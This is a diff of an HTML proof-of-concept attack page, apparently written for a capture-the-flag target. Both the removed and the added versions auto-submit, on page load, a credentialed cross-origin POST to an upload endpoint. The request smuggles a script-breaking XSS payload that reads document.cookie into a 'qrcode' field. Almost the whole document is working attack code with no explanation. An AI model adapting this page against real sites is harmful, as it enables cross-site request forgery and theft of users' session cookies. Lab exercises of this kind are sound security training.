@@ -1,28 +1,50 @@
-<html>
-  <!-- CORS PoC to Inject XSS Payload -->
-  <body>
-    <h2>CORS PoC</h2>
-    <div id="demo"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JavaScript Injection Example</title>
     <script>
-      function corsRequest() {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.withCredentials = true;
-        xhr.onreadystatechange = function() {
-          if (this.readyState == 4 && this.status == 200) {
-            document.getElementById("demo").innerHTML = this.responseText;
-          }
-        };
-        
-        // Vulnerable parameter with injected payload
-        var payload = "qrcode=</script><script>alert(document.cookie)></script>";
-        
-        xhr.send(payload);
-      }
+        window.onload = function() {
+            var xhr = new XMLHttpRequest();
+            var boundary = "---------------------------110423259726704186431623284180";
 
-      // Automatically submit the request on page load
-      window.onload = corsRequest;
+            // Constructing the payload with the desired script injection
+            var body = boundary + "\r\n" + 
+                "Content-Disposition: form-data; name=\"qrcode\"; filename=\"qrcode.txt\"\r\n" + 
+                "Content-Type: text/plain\r\n" + 
+                "\r\n" + 
+                "</script><script>console.log(document.cookie)</script>\r\n" + 
+                boundary + "--\r\n";
+
+            var uint8Array = new Uint8Array(body.length);
+            for (var i = 0; i < uint8Array.length; i++) {
+                uint8Array[i] = body.charCodeAt(i);
+            }
+
+            var blob = new Blob([uint8Array], { type: 'multipart/form-data; boundary=' + boundary });
+
+            xhr.open('POST', 'http://ctf.widyasecurity.com/upload', true);
+            xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8');
+            xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
+            xhr.withCredentials = true;
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('Payload sent successfully');
+                    // Optionally redirect or perform other actions on success
+                } else {
+                    console.error('Payload failed to send. Status: ' + xhr.status);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('Request failed');
+            };
+
+            xhr.send(blob);
+        };
     </script>
-  </body>
+</head>
+<body>
+</body>
 </html>
